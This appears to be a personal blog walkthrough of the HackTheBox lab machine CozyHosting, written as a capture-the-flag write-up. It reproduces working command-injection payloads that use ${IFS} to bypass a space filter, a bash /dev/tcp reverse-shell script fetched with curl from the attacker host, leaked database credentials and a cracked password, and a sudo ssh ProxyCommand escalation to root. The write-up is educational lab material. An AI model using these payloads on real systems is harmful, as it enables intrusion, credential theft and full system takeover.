---
title: HTB-CozyHosting
date: 2026-08-22 02:10:00 +0300
categories: [Linux, Web Application]
tags: [htb,command injection, directory brute force, space bypass, filter evasion technique, waf/filter bypass]     # TAG names should always be lowercase
---

#HTB CozyHosting — Walkthrough

CozyHosting is a Linux box on HackTheBox that chains a Spring Boot Actuator misconfiguration into session hijacking, OS command injection, and a final privilege escalation via a `sudo` misconfiguration on `ssh`. Here's how I worked through it.

## Enumeration

I started with the usual recon: `nmap` for open ports and services, `feroxbuster` for content discovery, and a quick `hydra` attempt against the login form (which didn't yield anything — no combination of credentials worked there).

I also tried the `/admin` page directly, but it returned a `401 Unauthorized`.

While poking around, navigating to `http://cozyhosting.htb/error` returned Spring Boot's default **Whitelabel Error Page**. That was the first real lead — it confirmed the backend was built with **Spring Boot**, a Java web framework known for exposing sensitive internal endpoints (called *Actuators*) if they aren't properly locked down.

## Finding the Actuator Endpoints

With Spring Boot confirmed, I fuzzed for Actuator-specific paths using a wordlist built for exactly this purpose:

- [SecLists — Java-Spring-Boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt)

```bash
ffuf -c -w spring-boot.txt -u http://cozyhosting.htb/FUZZ
```

This turned up several live endpoints, including:

```
actuator
actuator/mappings
actuator/env
actuator/env/lang
actuator/env/path
actuator/env/home
actuator/health
actuator/sessions
actuator/beans
admin        [401]
```

The `actuator/sessions` endpoint was the goldmine — Spring Boot's Actuator module exposes active session IDs when it's improperly configured. It revealed:

```
249ADA95FF84A470BDF4EC3105239A87	"kanderson"
```

## Session Hijacking

Trying that session cookie against the `/login` endpoint just kept reloading the login page. But swapping it in at `/admin` worked — I was logged in as `kanderson`, straight into the admin panel.

## From Admin Panel to Command Injection

Inside the admin dashboard, there was a feature to execute SSH connections against a host, backed by a `POST /executessh` request that took two parameters: `Hostname` and `Username`.

Testing with my own IP as the hostname and a lone `;` as the username threw an error identical to running plain `ssh ;` on the command line — a strong signal the backend was shelling out to the system `ssh` binary and passing user input unsanitized.

I confirmed command injection by triggering a ping back to my machine:

```
username=;ping${IFS}-c${IFS}1${IFS}10.10.14.120;
```

*(Spaces weren't accepted, so `${IFS}` — Bash's Internal Field Separator — was used as a stand-in.)*

Listening with `tcpdump` confirmed the ICMP round trip:

```
14:50:11.429266 IP cozyhosting.htb > 10.10.14.120: ICMP echo request, id 10, seq 1, length 64
14:50:11.429306 IP 10.10.14.120 > cozyhosting.htb: ICMP echo reply, id 10, seq 1, length 64
```

## Getting a Shell

A one-liner reverse shell (`bash -i >& /dev/tcp/...`) wasn't cooperating through the injection point, so instead I hosted a small script and pulled it down:

**rev.sh**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.120/1222 0>&1
```

The current working directory had no write permissions, so I dropped the file into `/tmp` instead:

```
username=;curl${IFS}http://10.10.14.120:111/rev.sh${IFS}-o${IFS}/tmp/rev.sh;
```

Then executed it:

```
username=;bash${IFS}/tmp/rev.sh;
```

Catching it on a listener landed a shell as `app`:

```bash
nc -nvlp 1222
# ...
app@cozyhosting:/app$
```

## Digging Through the Application

From the app directory, I pulled down `cloudhosting-0.0.1.jar` and unzipped it locally to inspect the source. A quick grep for credentials paid off:

```
./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
```

The full config confirmed a local PostgreSQL database:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Raiding the Database

Using those credentials to connect to Postgres from the reverse shell:

```bash
psql -h localhost -p 5432 -d cozyhosting -U postgres -W
```

The `users` table held bcrypt password hashes for two accounts:

```
name     | kanderson
password | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
role     | User

name     | admin
password | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
role     | Admin
```

## Cracking the Hash

The admin hash cracked quickly against `rockyou.txt` with `hashcat`:

```bash
hashcat -m 3200 admin_hash /usr/share/wordlists/rockyou.txt
```

Result:

```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

That password turned out to belong to the system user `josh`, and worked over SSH — giving me the user flag.

## Privilege Escalation to Root

A quick `sudo -l` check as `josh` revealed a dangerously broad permission:

```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Being able to run `ssh` as root with arbitrary arguments is a well-known escalation path documented on [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/). Abusing the `ProxyCommand` option gets an arbitrary command executed as root before the SSH connection is even attempted:

```bash
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

That dropped me straight into a root shell:

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Summary

| Stage | Technique |
|---|---|
| Recon | Spring Boot fingerprinting via Whitelabel Error Page |
| Enumeration | Actuator endpoint fuzzing (`/actuator/sessions`) |
| Access | Session ID hijacking to reach `/admin` |
| Foothold | OS command injection via `/executessh` |
| Lateral movement | Credentials recovered from `.jar` source + Postgres DB dump |
| Privilege escalation | `sudo` misconfiguration on `/usr/bin/ssh` (GTFOBins) |

CozyHosting is a great reminder of two things: how much Spring Boot Actuator endpoints can leak when they're left exposed, and how a single overly permissive `sudo` rule can undo an otherwise solid setup. Definitely a fun one for anyone practicing web-to-root chains.
